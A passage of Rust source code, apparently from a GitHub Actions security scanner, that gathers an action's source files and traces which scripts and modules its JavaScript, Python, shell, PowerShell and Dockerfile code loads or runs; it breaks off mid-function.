fn collect_local_source_files(action_dir: &Path) -> Result<LocalSourceCollection> {
    fn visit(
        dir: &Path,
        base: &Path,
        targets: &mut Vec<(PathBuf, SourceFileKind)>,
        available: &mut Vec<PathBuf>,
        complete: &mut bool,
    ) -> Result<()> {
        let mut entries = Vec::new();
        for entry in std::fs::read_dir(dir).with_context(|| format!("reading {}", dir.display()))? {
            entries.push(entry?);
        }
        entries.sort_by_key(|e| e.path());

        for entry in entries {
            let path = entry.path();
            let relative = path
                .strip_prefix(base)
                .unwrap_or(&path)
                .to_string_lossy()
                .replace('\\', "/");

            if is_vendored_path(&relative) {
                continue;
            }

            // `file_type()` does not follow symlinks, so a symlinked entry is
            // neither file nor dir here and is skipped. Deliberate: it keeps
            // traversal inside the action directory (a symlink can't redirect
            // the scan outside it) at the cost of not scanning symlinked source
            // — an acceptable trade-off since local actions are first-party.
            let file_type = entry.file_type()?;
            if file_type.is_symlink() {
                *complete = false;
                continue;
            }
            if file_type.is_dir() {
                if is_nonruntime_support_path(&relative) {
                    continue;
                }
                visit(&path, base, targets, available, complete)?;
            } else if file_type.is_file() {
                available.push(path.clone());
                if let Some(kind) = source_file_kind(&relative) {
                    if targets.len() == MAX_SOURCE_FILES {
                        *complete = false;
                    } else if targets.len() < MAX_SOURCE_FILES {
                        targets.push((path, kind));
                    }
                }
            }
        }
        Ok(())
    }

    let mut targets = Vec::new();
    let mut available = Vec::new();
    let mut complete = true;
    visit(
        action_dir,
        action_dir,
        &mut targets,
        &mut available,
        &mut complete,
    )?;
    if targets.is_empty() {
        for name in ["Dockerfile", "dockerfile"] {
            let path = action_dir.join(name);
            if available.contains(&path) {
                targets.push((path, SourceFileKind::Dockerfile));
                break;
            }
        }
    }
    Ok((targets, available, complete))
}

fn source_file_kind(relative: &str) -> Option<SourceFileKind> {
    if relative == "action.yml" || relative == "action.yaml" {
        Some(SourceFileKind::ActionYml)
    } else {
        None
    }
}

fn is_shell_source(path: &str) -> bool {
    path.ends_with(".sh")
        || path.ends_with(".bash")
        || path.ends_with(".zsh")
        || path.ends_with(".ps1")
}

fn is_reusable_workflow(path: &str) -> bool {
    (path.ends_with(".yml") || path.ends_with(".yaml")) && path.contains("/.github/workflows/")
        || path.starts_with(".github/workflows/")
}

fn is_javascript_source(path: &str) -> bool {
    path.ends_with(".js")
        || path.ends_with(".ts")
        || path.ends_with(".mjs")
        || path.ends_with(".cjs")
        || path.ends_with(".mts")
        || path.ends_with(".cts")
}

#[cfg(test)]
fn force_include_remote_source_dependencies(
    tree: &[crate::github::TreeEntry],
    tree_complete: bool,
    action_base: &str,
    targets: &mut Vec<(String, SourceFileKind)>,
    contents: &[Option<Result<String>>],
) -> bool {
    follow_source_dependencies(
        tree,
        tree_complete,
        action_base,
        targets,
        contents,
        &mut HashMap::new(),
        &mut HashSet::new(),
    )
}

/// Adds the files each fetched source loads or runs. `contexts` holds the
/// directory each followed file starts in; it only moves toward
/// unresolved, so repeating until nothing changes terminates.
fn follow_source_dependencies(
    tree: &[crate::github::TreeEntry],
    tree_complete: bool,
    action_base: &str,
    targets: &mut Vec<(String, SourceFileKind)>,
    contents: &[Option<Result<String>>],
    contexts: &mut HashMap<String, LocatedDirectory>,
    relocated: &mut HashSet<String>,
) -> bool {
    let available: HashSet<&str> = tree
        .iter()
        .filter(|entry| entry.entry_type == "blob")
        .map(|entry| entry.path.as_str())
        .collect();
    let sources: Vec<(String, SourceFileKind, String)> = targets
        .iter()
        .zip(contents)
        .filter_map(|((path, kind), content)| {
            content
                .as_ref()
                .and_then(|content| content.as_ref().ok())
                .map(|content| (path.clone(), *kind, content.clone()))
        })
        .collect();
    let mut complete = true;
    // Any file the action runs can replace the loader or patch a built-in
    // for every other one.
    let uses: Vec<_> = sources
        .iter()
        .filter(|(_, kind, _)| *kind == SourceFileKind::JavaScript)
        .map(|(path, _, content)| crate::audit_javascript::builtin_use(path, content))
        .collect();
    let native_modules = !uses.is_empty() && !uses.iter().any(|use_| use_.replaces_loader);
    let patched_builtins: Vec<String> = uses
        .into_iter()
        .flat_map(|use_| use_.patched)
        .collect::<std::collections::BTreeSet<_>>()
        .into_iter()
        .collect();

    for (path, kind, content) in sources {
        let context = SourceContext {
            directory: contexts.get(&path).cloned().unwrap_or_default(),
            environment: Vec::new(),
            native_modules,
            patched_builtins: patched_builtins.clone(),
        };
        match kind {
            SourceFileKind::JavaScript => {
                let code = strip_javascript_comments(&content);
                let quotes = crate::audit::JavaScriptQuoteIndex::new(&code);
                for captures in JS_LOCAL_DEPENDENCY_RE.captures_iter(&code) {
                    if relocated.contains(&path) {
                        complete = false;
                    }
                    let Some(dependency) = captures.name("path") else {
                        complete = false;
                        continue;
                    };
                    complete &= include_remote_javascript_dependency(
                        &available,
                        targets,
                        &path,
                        dependency.as_str(),
                    );
                }
                for captures in JS_LOADER_CALL_RE.captures_iter(&code) {
                    if captures
                        .get(0)
                        .is_some_and(|matched| quotes.is_quoted(matched.start()))
                    {
                        continue;
                    }
                    let Some(argument) = captures.name("argument") else {
                        complete = false;
                        continue;
                    };
                    let argument = argument.as_str().trim();
                    if let Some(dependency) = exact_javascript_loader_specifier(argument) {
                        if dependency.starts_with("./") || dependency.starts_with("../") {
                            if relocated.contains(&path) {
                                complete = false;
                            }
                            complete &= include_remote_javascript_dependency(
                                &available, targets, &path, dependency,
                            );
                        }
                    } else if !argument.chars().all(|character| character.is_ascii_digit()) {
                        complete = false;
                    }
                }
                let (executed_strings, executed_strings_complete) =
                    executed_javascript_string_literals(&code, &quotes);
                complete &= executed_strings_complete;
                for executed in executed_strings {
                    for captures in JS_LOADER_CALL_RE.captures_iter(executed) {
                        let Some(argument) = captures.name("argument") else {
                            complete = false;
                            continue;
                        };
                        let argument = argument.as_str().trim();
                        if let Some(dependency) = exact_javascript_loader_specifier(argument) {
                            if dependency.starts_with("./") || dependency.starts_with("../") {
                                if relocated.contains(&path) {
                                    complete = false;
                                }
                                complete &= include_remote_javascript_dependency(
                                    &available, targets, &path, dependency,
                                );
                            }
                        } else if !argument.chars().all(|character| character.is_ascii_digit()) {
                            complete = false;
                        }
                    }
                }
                for mut execution in
                    crate::audit_javascript::located_executions(&path, &content, &context)
                {
                    if relocated.contains(&path) {
                        execution.unbind_self_location();
                    }
                    complete &= include_located_execution(
                        &available,
                        targets,
                        contexts,
                        relocated,
                        &path,
                        action_base,
                        &execution,
                    );
                }
            }
            SourceFileKind::Python => {
                // `sys.path[0]` is the entry script's directory, or the working
                // directory under `-m`, so an absolute import may resolve beside
                // any entry that reaches this module rather than beside it.
                let python_roots: Vec<String> = targets
                    .iter()
                    .filter(|(_, kind)| *kind == SourceFileKind::Python)
                    .map(|(target, _)| path_parent(target).to_string())
                    .chain(std::iter::once(action_base.to_string()))
                    .collect::<std::collections::BTreeSet<_>>()
                    .into_iter()
                    .collect();
                let (executions, loaded_modules) = python_located_executions(&content, &context);
                for mut execution in executions {
                    if relocated.contains(&path) {
                        execution.unbind_self_location();
                    }
                    complete &= include_located_execution(
                        &available,
                        targets,
                        contexts,
                        relocated,
                        &path,
                        action_base,
                        &execution,
                    );
                }
                for module in loaded_modules {
                    let Some(module) = module else {
                        complete = false;
                        continue;
                    };
                    let found = include_remote_python_dependency(
                        &available,
                        targets,
                        &path,
                        &module,
                        &python_roots,
                    );
                    if relocated.contains(&path) && found {
                        complete = false;
                    }
                    if !tree_complete && !found {
                        complete = false;
                    }
                }
                for captures in PYTHON_SIBLING_IMPORT_RE.captures_iter(&content) {
                    let modules: Vec<_> = if let Some(module) = captures.name("from") {
                        vec![module.as_str()]
                    } else {
                        captures
                            .name("imports")
                            .into_iter()
                            .flat_map(|imports| imports.as_str().split(','))
                            .filter_map(|module| module.split_whitespace().next())
                            .collect()
                    };
                    for module in modules {
                        let found = include_remote_python_dependency(
                            &available,
                            targets,
                            &path,
                            module,
                            &python_roots,
                        );
                        if relocated.contains(&path) && found {
                            complete = false;
                        }
                        if (!tree_complete || module.starts_with('.')) && !found {
                            complete = false;
                        }
                    }
                    if let (Some(module), Some(members)) =
                        (captures.name("from"), captures.name("members"))
                    {
                        let members = members.as_str().trim().trim_matches(['(', ')']);
                        for member in members
                            .split(',')
                            .filter_map(|member| member.split_whitespace().next())
                        {
                            let separator = if module.as_str().ends_with('.') {
                                ""
                            } else {
                                "."
                            };
                            let module = format!("{}{separator}{member}", module.as_str());
                            include_remote_python_dependency(
                                &available,
                                targets,
                                &path,
                                &module,
                                &python_roots,
                            );
                        }
                    }
                }
            }
            SourceFileKind::Shell => {
                for mut execution in
                    shell_located_executions(&content, path.ends_with(".ps1"), context.directory)
                {
                    if relocated.contains(&path) {
                        execution.unbind_self_location();
                    }
                    complete &= include_located_execution(
                        &available,
                        targets,
                        contexts,
                        relocated,
                        &path,
                        action_base,
                        &execution,
                    );
                }
                for captures in SHELL_LOCAL_SOURCE_RE.captures_iter(&content) {
                    if relocated.contains(&path) {
                        complete = false;
                    }
                    let Some(dependency) = captures.name("path") else {
                        complete = false;
                        continue;
                    };
                    complete &= include_remote_exact_dependency(
                        &available,
                        targets,
                        path_parent(&path),
                        dependency.as_str(),
                        SourceFileKind::Shell,
                    );
                }
                for captures in SHELL_ACTION_SOURCE_RE.captures_iter(&content) {
                    let Some(dependency) = captures.name("path") else {
                        complete = false;
                        continue;
                    };
                    complete &= include_remote_exact_dependency(
                        &available,
                        targets,
                        action_base,
                        dependency.as_str(),
                        SourceFileKind::Shell,
                    );
                }
            }
            SourceFileKind::Dockerfile => {
                let (sources, parsed) = docker_local_source_paths(&content);
                complete &= parsed;
                for source in sources {
                    complete &= include_remote_docker_dependency(
                        &available,
                        tree_complete,
                        targets,
                        action_base,
                        &source,
                    );
                }
                for execution in dockerfile_located_executions(&content, &available, action_base) {
                    complete &= include_located_execution(
                        &available,
                        targets,
                        contexts,
                        relocated,
                        &path,
                        action_base,
                        &execution,
                    );
                }
            }
            SourceFileKind::ActionYml | SourceFileKind::WorkflowYml => {}
        }
    }
    complete
}

/// A file that source code executes through its own or the action's location.
/// `path` is a location-marked value; `None` could not be bound to one file
/// and fails closed. `kind` follows the interpreter that runs it, not the
/// file's extension. An optional execution names a module the interpreter may
/// also find outside the action. `directory` is where the executed file
/// starts running; `None` is the caller's.
#[derive(Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub(crate) struct LocatedExecution {
    path: Option<String>,
    kind: SourceFileKind,
    optional: bool,
    directory: Option<LocatedDirectory>,
    relocated: bool,
}

impl LocatedExecution {
    pub(crate) fn of(value: &str, kind: SourceFileKind) -> Self {
        Self {
            path: bound_location(value).map(str::to_string),
            kind,
            optional: false,
            directory: None,
            relocated: false,
        }
    }

    pub(crate) fn unresolved(kind: SourceFileKind) -> Self {
        Self {
            path: None,
            kind,
            optional: false,
            directory: None,
            relocated: false,
        }
    }

    pub(crate) fn copied(value: &str, kind: SourceFileKind) -> Self {
        Self {
            relocated: true,
            ..Self::of(value, kind)
        }
    }

    fn unbind_self_location(&mut self) {
        if self
            .path
            .as_deref()
            .is_some_and(|path| path.contains(SELF_LOCATION))
        {
            self.path = None;
            self.optional = false;
        }
        if self.directory.as_ref().is_some_and(
            |directory| matches!(directory, LocatedDirectory::Located(path) if path.contains(SELF_LOCATION)),
        ) {
            self.directory = Some(LocatedDirectory::Unresolved);
        }
    }
}

/// The directory relative commands run from. `Caller` is wherever the action
/// was invoked from, which is not action source.
#[derive(Debug, Clone, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub(crate) enum LocatedDirectory {
    #[default]
    Caller,
    Located(String),
    Unresolved,
}

/// Where a source starts running: its working directory, step environment
/// variables that hold action locations, and whether nothing in the action
/// visibly replaces Node's module loader.
#[derive(Default, serde::Serialize, serde::Deserialize)]
pub(crate) struct SourceContext {
    pub(crate) directory: LocatedDirectory,
    pub(crate) environment: Vec<(String, String)>,
    pub(crate) native_modules: bool,
    pub(crate) patched_builtins: Vec<String>,
}

impl LocatedDirectory {
    pub(crate) fn from_value(value: &str) -> Self {
        if !is_location_derived(value) {
            Self::Caller
        } else if let Some(path) = bound_location(value) {
            Self::Located(path.trim_end_matches('/').to_string())
        } else {
            Self::Unresolved
        }
    }

    fn join(&self, relative: &str) -> Self {
        match self {
            Self::Caller => Self::Caller,
            Self::Unresolved => Self::Unresolved,
            Self::Located(_) if is_dynamic_word(relative) => Self::Unresolved,
            Self::Located(directory) => Self::Located(format!("{directory}/{relative}")),
        }
    }

    /// The directory after code that may or may not have run.
    fn merge(&self, other: &Self) -> Self {
        if self == other {
            self.clone()
        } else {
            Self::Unresolved
        }
    }
}

pub(crate) fn is_location_derived(value: &str) -> bool {
    value.contains(SELF_LOCATION)
        || value.contains(ACTION_LOCATION)
        || value.contains(REPOSITORY_LOCATION)
        || value.contains(UNRESOLVED_LOCATION)
}

fn is_dynamic_word(value: &str) -> bool {
    value.contains(['$', '`']) || value.contains(DYNAMIC_VALUE) || is_location_derived(value)
}

/// `value` when it is exactly one location-relative path.
fn bound_location(value: &str) -> Option<&str> {
    let rest = value
        .strip_prefix(SELF_LOCATION)
        .or_else(|| value.strip_prefix(ACTION_LOCATION))
        .or_else(|| value.strip_prefix(REPOSITORY_LOCATION))?;
    if rest.is_empty() {
        return Some(value);
    }
    let relative = rest.strip_prefix('/')?;
    if relative == SELF_FILE && value.starts_with(SELF_LOCATION) {
        return Some(value);
    }
    (!relative.contains("@pinprick-")
        && !relative.contains(|character: char| {
            character.is_whitespace()
                || matches!(
                    character,
                    '$' | '`'
                        | '*'
                        | '?'
                        | '['
                        | '\\'
                        | '~'
                        | '"'
                        | '\''
                        | '{'
                        | '}'
                        | '('
                        | ')'
                        | '|'
                        | ';'
                        | '&'
                        | '<'
                        | '>'
                )
        }))
    .then_some(value)
}

fn resolve_located_path(value: &str, source: &str, action_base: &str) -> Option<String> {
    let (base, relative) = located_parts(value, source, action_base)?;
    let relative = relative.strip_prefix('/')?;
    if relative == SELF_FILE {
        return Some(source.to_string());
    }
    normalize_action_entrypoint_path(base, relative)
}

/// The repository-relative directory a located value names, as a
/// repository-marked directory.
fn resolve_located_directory(
    directory: &LocatedDirectory,
    source: &str,
    action_base: &str,
) -> LocatedDirectory {
    let LocatedDirectory::Located(value) = directory else {
        return directory.clone();
    };
    let Some((base, relative)) = located_parts(value, source, action_base) else {
        return LocatedDirectory::Unresolved;
    };
    let relative = relative.trim_start_matches('/');
    if relative == SELF_FILE {
        return LocatedDirectory::Unresolved;
    }
    let path = if relative.is_empty() {
        (!base.is_empty())
            .then(|| normalize_action_entrypoint_path("", base))
            .flatten()
    } else {
        normalize_action_entrypoint_path(base, relative)
    };
    match path {
        Some(path) => LocatedDirectory::Located(format!("{REPOSITORY_LOCATION}/{path}")),
        None if base.is_empty() && relative.is_empty() => {
            LocatedDirectory::Located(REPOSITORY_LOCATION.to_string())
        }
        None => LocatedDirectory::Unresolved,
    }
}

/// The base directory a bound located value is relative to, and the rest.
fn located_parts<'v>(
    value: &'v str,
    source: &'v str,
    action_base: &'v str,
) -> Option<(&'v str, &'v str)> {
    let value = bound_location(value)?;
    if let Some(rest) = value.strip_prefix(SELF_LOCATION) {
        Some((path_parent(source), rest))
    } else if let Some(rest) = value.strip_prefix(ACTION_LOCATION) {
        Some((action_base, rest))
    } else {
        Some(("", value.strip_prefix(REPOSITORY_LOCATION)?))
    }
}

fn include_located_execution(
    available: &HashSet<&str>,
    targets: &mut Vec<(String, SourceFileKind)>,
    contexts: &mut HashMap<String, LocatedDirectory>,
    relocated: &mut HashSet<String>,
    source: &str,
    action_base: &str,
    execution: &LocatedExecution,
) -> bool {
    let Some(path) = execution
        .path
        .as_deref()
        .and_then(|path| resolve_located_path(path, source, action_base))
    else {
        return execution.optional;
    };
    if !available.contains(path.as_str()) {
        return execution.optional;
    }
    if execution.relocated {
        relocated.insert(path.clone());
    }
    let directory = execution
        .directory
        .as_ref()
        .map_or(LocatedDirectory::Caller, |directory| {
            resolve_located_directory(directory, source, action_base)
        });
    enter_directory(contexts, &path, directory);
    // A file run by another interpreter is scanned as that language too.
    if !targets
        .iter()
        .any(|(existing, kind)| *existing == path && *kind == execution.kind)
    {
        targets.push((path, execution.kind));
    }
    true
}

/// Records a directory a followed file starts in; a file started from two
/// different directories has none it can rely on.
fn enter_directory(
    contexts: &mut HashMap<String, LocatedDirectory>,
    path: &str,
    directory: LocatedDirectory,
) {
    contexts
        .entry(path.to_string())
        .and_modify(|existing| *existing = existing.merge(&directory))
        .or_insert(directory);
}

pub(crate) fn join_location(
    parts: impl IntoIterator<Item = String>,
    restart_at_absolute: bool,
) -> String {
    let mut joined = String::new();
    for part in parts {
        let absolute = part.starts_with('/')
            || part.starts_with(SELF_LOCATION)
            || part.starts_with(ACTION_LOCATION);
        if joined.is_empty() || restart_at_absolute && absolute {
            joined = part;
        } else if !part.is_empty() {
            if !joined.ends_with('/') {
                joined.push('/');
            }
            joined.push_str(part.trim_start_matches('/'));
        }
    }
    if joined.is_empty() {
        DYNAMIC_VALUE.to_string()
    } else {
        joined
    }
}

pub(crate) fn dirname_location(value: &str) -> String {
    if let Some(directory) = value
        .strip_suffix(SELF_FILE)
        .and_then(|directory| directory.strip_suffix('/'))
    {
        return directory.to_string();
    }
    let trimmed = if value.len() > 1 {
        value.trim_end_matches('/')
    } else {
        value
    };
    if trimmed == SELF_LOCATION || trimmed == ACTION_LOCATION {
        return format!("{trimmed}/..");
    }
    match trimmed.rsplit_once('/') {
        Some(("", _)) => "/".to_string(),
        Some((parent, _)) => parent.to_string(),
        None if is_location_derived(value) => UNRESOLVED_LOCATION.to_string(),
        None => DYNAMIC_VALUE.to_string(),
    }
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum InterpreterFamily {
    Posix,
    PowerShell,
    Python,
    Node,
}

enum Interpreter {
    Script(SourceFileKind, InterpreterFamily),
    /// Runs a script language this scanner cannot read.
    Unsupported,
    /// Runs the command that follows it.
    Wrapper,
    Other,
}

fn script_interpreter(program: &str) -> Interpreter {
    let name = program.rsplit(['/', '\\']).next().unwrap_or(program);
    let name = name
        .strip_suffix(".exe")
        .unwrap_or(name)
        .to_ascii_lowercase();
    match name.as_str() {
        "bash" | "sh" | "zsh" | "dash" | "ksh" | "mksh" | "ash" | "fish" | "csh" | "tcsh"
        | "source" | "." => Interpreter::Script(SourceFileKind::Shell, InterpreterFamily::Posix),
        "pwsh" | "powershell" => {
            Interpreter::Script(SourceFileKind::Shell, InterpreterFamily::PowerShell)
        }
        "node" | "nodejs" | "deno" | "bun" | "tsx" | "ts-node" => {
            Interpreter::Script(SourceFileKind::JavaScript, InterpreterFamily::Node)
        }
        "ruby" | "perl" | "php" | "lua" | "rscript" | "tclsh" | "osascript" | "groovy"
        | "elixir" => Interpreter::Unsupported,
        "timeout" | "xargs" | "stdbuf" | "ionice" | "taskset" | "setsid" | "flock" | "chrt"
        | "unbuffer" | "gosu" | "su-exec" | "dumb-init" | "tini" | "caffeinate" | "arch"
        | "strace" | "ltrace" | "valgrind" | "watch" => Interpreter::Wrapper,
        name if name
            .strip_prefix("python")
            .or_else(|| name.strip_prefix("pypy"))
            .is_some_and(|version| {
                version
                    .chars()
                    .all(|character| character.is_ascii_digit() || character == '.')
            }) =>
        {
            Interpreter::Script(SourceFileKind::Python, InterpreterFamily::Python)
        }
        _ => Interpreter::Other,
    }
}

fn direct_execution_kind(path: &str) -> SourceFileKind {
    executable_source_kind(path).unwrap_or(SourceFileKind::Shell)
}

/// How a nested command is analyzed: its recursion depth, and whether it
/// runs in a composite step.
#[derive(Clone, Copy)]
pub(crate) struct ShellScan {
    pub(crate) depth: usize,
    pub(crate) composite: bool,
}

/// Executions a parsed command performs through a location, including a
/// program an interpreter reads from a pipe.
pub(crate) fn command_located_executions(
    words: &[String],
    directory: &LocatedDirectory,
    scan: ShellScan,
    executions: &mut Vec<LocatedExecution>,
) {
    let before = executions.len();
    let mut upstream: Vec<&String> = Vec::new();
    for stage in words.split(|word| word == "|") {
        if let Some(kind) = stage_located_executions(stage, directory, scan, executions) {
            for word in &upstream {
                executions.push(LocatedExecution::of(word, kind));
            }
        }
        upstream = stage
            .iter()
            .filter(|word| is_location_derived(word))
            .collect();
    }
    for execution in &mut executions[before..] {
        execution.directory.get_or_insert_with(|| directory.clone());
    }
}

/// Records one pipeline stage's executions. Returns the interpreter's kind
/// when it reads its program from standard input.
fn stage_located_executions(
    stage: &[String],
    directory: &LocatedDirectory,
    scan: ShellScan,
    executions: &mut Vec<LocatedExecution>,
) -> Option<SourceFileKind> {
    let Some(mut index) = crate::audit_shell::wrapped_command_word_index(stage) else {
        if stage.iter().any(|word| is_location_derived(word)) {
            executions.push(LocatedExecution::unresolved(SourceFileKind::Shell));
        }
        return None;
    };
    // PowerShell's call operator and `Start-Process` run the next word.
    loop {
        match stage.get(index).map(String::as_str) {
            Some("&") => index += 1,
            Some(word) if word.eq_ignore_ascii_case("Start-Process") => {
                index += 1;
                if stage
                    .get(index)
                    .is_some_and(|word| word.eq_ignore_ascii_case("-FilePath"))
                {
                    index += 1;
                }
            }
            _ => break,
        }
    }
    let program = stage.get(index)?;
    if is_location_derived(program) {
        executions.push(LocatedExecution::of(
            program,
            direct_execution_kind(program),
        ));
        return None;
    }
    let (kind, family) = match script_interpreter(program) {
        Interpreter::Script(kind, family) => (kind, family),
        Interpreter::Unsupported => {
            let operands = &stage[index + 1..];
            if operands.iter().any(|word| is_location_derived(word))
                || *directory != LocatedDirectory::Caller
                    && operands.iter().any(|word| !word.starts_with('-'))
            {
                executions.push(LocatedExecution::unresolved(SourceFileKind::Shell));
            }
            return None;
        }
        Interpreter::Wrapper => {
            let offset = stage[index + 1..].iter().position(|word| {
                is_location_derived(word)
                    || word.starts_with("./")
                    || matches!(
                        script_interpreter(word),
                        Interpreter::Script(..) | Interpreter::Unsupported
                    )
            })?;
            return stage_located_executions(
                &stage[index + 1 + offset..],
                directory,
                scan,
                executions,
            );
        }
        Interpreter::Other => {
            // A program named by a relative path runs from the current directory.
            if program.contains('/') && !program.starts_with(['/', '~']) {
                relative_execution(
                    program,
                    direct_execution_kind(program),
                    directory,
                    executions,
                );
            }
            copied_located_files(program, &stage[index + 1..], executions);
            return None;
        }
    };

    let mut position = index + 1;
    if family == InterpreterFamily::Node && stage.get(position).is_some_and(|word| word == "run") {
        position += 1;
    }
    while let Some(word) = stage.get(position) {
        position += 1;
        let lowercase = word.to_ascii_lowercase();
        let runs_code = match family {
            InterpreterFamily::Posix => {
                word.starts_with('-') && !word.starts_with("--") && word.contains('c')
            }
            InterpreterFamily::PowerShell => matches!(
                lowercase.as_str(),
                "-command" | "-c" | "-encodedcommand" | "-ec" | "-e"
            ),
            InterpreterFamily::Python => word == "-c",
            InterpreterFamily::Node => {
                matches!(word.as_str(), "-e" | "--eval" | "-p" | "--print" | "eval")
            }
        };
        if runs_code {
            let code = stage.get(position);
            if matches!(
                family,
                InterpreterFamily::Posix | InterpreterFamily::PowerShell
            ) && scan.depth < MAX_LOCATION_DEPTH
            {
                if let Some(code) = code {
                    shell_script_executions(
                        code,
                        family == InterpreterFamily::PowerShell,
                        ShellScan {
                            depth: scan.depth + 1,
                            ..scan
                        },
                        ShellLocationState::starting_in(directory.clone()),
                        executions,
                    );
                }
            } else if code.is_some_and(|code| is_location_derived(code)) {
                executions.push(LocatedExecution::unresolved(kind));
            }
            return None;
        }
        if family == InterpreterFamily::Python && word == "-m" {
            if let Some(module) = stage.get(position) {
                module_execution(module, directory, executions);
            }
            return None;
        }
        if let Some(input) = word.strip_prefix('<') {
            let input = if input.is_empty() {
                stage.get(position).map_or("", String::as_str)
            } else {
                input
            };
            operand_execution(input, kind, directory, executions);
            return None;
        }
        if word.starts_with('-') || family == InterpreterFamily::Posix && word.starts_with('+') {
            let takes_value = match family {
                InterpreterFamily::Posix => word.contains(['o', 'O']) && !word.starts_with("--"),
                InterpreterFamily::PowerShell => matches!(
                    lowercase.as_str(),
                    "-executionpolicy"
                        | "-ep"
                        | "-workingdirectory"
                        | "-wd"
                        | "-configurationname"
                        | "-outputformat"
                        | "-inputformat"
                        | "-windowstyle"
                        | "-version"
                        | "-settingsfile"
                        | "-custompipename"
                ),
                InterpreterFamily::Python => matches!(word.as_str(), "-W" | "-X" | "-Q"),
                InterpreterFamily::Node => matches!(
                    word.as_str(),
                    "-r" | "--require"
                        | "--import"
                        | "--loader"
                        | "--experimental-loader"
                        | "-C"
                        | "--conditions"
                        | "--input-type"
                        | "--title"
                        | "--env-file"
                ),
            };
            if family == InterpreterFamily::PowerShell
                && matches!(lowercase.as_str(), "-file" | "-f")
            {
                if let Some(file) = stage.get(position) {
                    operand_execution(file, kind, directory, executions);
                }
                return None;
            }
            // Node loads these modules before the program; other option
            // values are data.
            let (flag, attached) = word
                .split_once('=')
                .map_or((word.as_str(), None), |(flag, value)| (flag, Some(value)));
            let preload = family == InterpreterFamily::Node
                && matches!(
                    flag,
                    "-r" | "--require" | "--import" | "--loader" | "--experimental-loader"
                );
            if preload && let Some(module) = attached {
                preload_execution(module, directory, executions);
            } else if takes_value {
                if preload && let Some(module) = stage.get(position) {
                    preload_execution(module, directory, executions);
                }
                position += 1;
            } else if is_location_derived(word) {
                executions.push(LocatedExecution::unresolved(kind));
            }
            continue;
        }
        operand_execution(word, kind, directory, executions);
        return None;
    }
    Some(kind)
}

/// A module Node loads before the program: a file when it is a location or a
/// relative path, otherwise a package.
fn preload_execution(
    module: &str,
    directory: &LocatedDirectory,
    executions: &mut Vec<LocatedExecution>,
) {
    if is_location_derived(module) {
        executions.push(LocatedExecution::of(module, SourceFileKind::JavaScript));
    } else if module.starts_with("./") || module.starts_with("../") {
        relative_execution(module, SourceFileKind::JavaScript, directory, executions);
    }
}

/// A located file a copying program duplicates may run later from the copy.
/// Source files are scanned in their own language; a copied data file is
/// only data, and any other copied file cannot be followed.
fn copied_located_files(
    program: &str,
    operands: &[String],
    executions: &mut Vec<LocatedExecution>,
) {
    let name = program.rsplit(['/', '\\']).next().unwrap_or(program);
    let copies = matches!(
        name,
        "cp" | "mv" | "ln" | "install" | "rsync" | "ditto" | "scp"
    ) || name == "cat" && operands.iter().any(|word| word.starts_with('>'));
    if !copies {
        return;
    }
    for operand in operands.iter().filter(|word| is_location_derived(word)) {
        match bound_location(operand) {
            Some(path) if executable_source_kind(path).is_some() => {
                executions.push(LocatedExecution::copied(path, direct_execution_kind(path)));
            }
            Some(path) if is_copied_data_path(path) => {}
            _ => executions.push(LocatedExecution::unresolved(SourceFileKind::Shell)),
        }
    }
}

/// Structured data a copy cannot turn into a script. Plain text is not
/// included: renaming it is how a script hides.
pub(crate) fn is_copied_data_path(path: &str) -> bool {
    is_nonexecutable_data_path(path)
        && !Path::new(path)
            .extension()
            .and_then(|extension| extension.to_str())
            .is_some_and(|extension| extension.eq_ignore_ascii_case("txt"))
}

fn operand_execution(
    word: &str,
    kind: SourceFileKind,
    directory: &LocatedDirectory,
    executions: &mut Vec<LocatedExecution>,
) {
    if is_location_derived(word) || word.starts_with("$(") || word.starts_with('`') {
        executions.push(LocatedExecution::of(word, kind));
    } else if !word.is_empty() && !word.starts_with(['/', '~']) {
        relative_execution(word, kind, directory, executions);
    }
}

fn relative_execution(
    word: &str,
    kind: SourceFileKind,
    directory: &LocatedDirectory,
    executions: &mut Vec<LocatedExecution>,
) {
    match directory.join(word) {
        LocatedDirectory::Caller => {}
        LocatedDirectory::Located(path) => executions.push(LocatedExecution::of(&path, kind)),
        LocatedDirectory::Unresolved => executions.push(LocatedExecution::unresolved(kind)),
    }
}

fn module_execution(
    module: &str,
    directory: &LocatedDirectory,
    executions: &mut Vec<LocatedExecution>,
) {
    let module = module.replace('.', "/");
    for candidate in [format!("{module}.py"), format!("{module}/__main__.py")] {
        match directory.join(&candidate) {
            LocatedDirectory::Caller => return,
            LocatedDirectory::Located(path) => executions.push(LocatedExecution {
                path: Some(path),
                kind: SourceFileKind::Python,
                optional: true,
                directory: None,
                relocated: false,
            }),
            LocatedDirectory::Unresolved => {
                executions.push(LocatedExecution::unresolved(SourceFileKind::Python));
                return;
            }
        }
    }
}

/// Where a shell script's relative commands run, and the location each
/// tracked variable holds.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ShellLocationState {
    variables: HashMap<String, String>,
    directory: LocatedDirectory,
    previous: LocatedDirectory,
    stack: Vec<LocatedDirectory>,
}

impl ShellLocationState {
    pub(crate) fn starting_in(directory: LocatedDirectory) -> Self {
        Self {
            variables: HashMap::new(),
            previous: directory.clone(),
            directory,
            stack: Vec::new(),
        }
    }

    /// The state after code that may or may not have run.
    fn merge(&self, other: &Self) -> Self {
        let variables = self
            .variables
            .keys()
            .chain(other.variables.keys())
            .map(|name| {
                let value = match (self.variables.get(name), other.variables.get(name)) {
                    (Some(left), Some(right)) if left == right => left.clone(),
                    _ => UNRESOLVED_LOCATION.to_string(),
                };
                (name.clone(), value)
            })
            .collect();
        let stack = if self.stack == other.stack {
            self.stack.clone()
        } else {
            vec![LocatedDirectory::Unresolved; self.stack.len().max(other.stack.len())]
        };
        Self {
            variables,
            directory: self.directory.merge(&other.directory),
            previous: self.previous.merge(&other.previous),
            stack,
        }
    }
}

/// Shell structure whose end changes what the script knows: a subshell's
/// changes end with it, and code that may not run merges with the state
/// before it.
enum ShellFrame {
    Subshell(ShellLocationState),
    Conditional(ShellLocationState),
    /// The state before the loop, and a `for` loop's variable.
    Loop(ShellLocationState, Option<String>),
    Case(ShellLocationState),
    Group,
}

/// A shell or PowerShell helper file's executions, starting in `directory`.
fn shell_located_executions(
    content: &str,
    powershell: bool,
    directory: LocatedDirectory,
) -> Vec<LocatedExecution> {
    let mut executions = Vec::new();
    shell_script_executions(
        content,
        powershell,
        ShellScan {
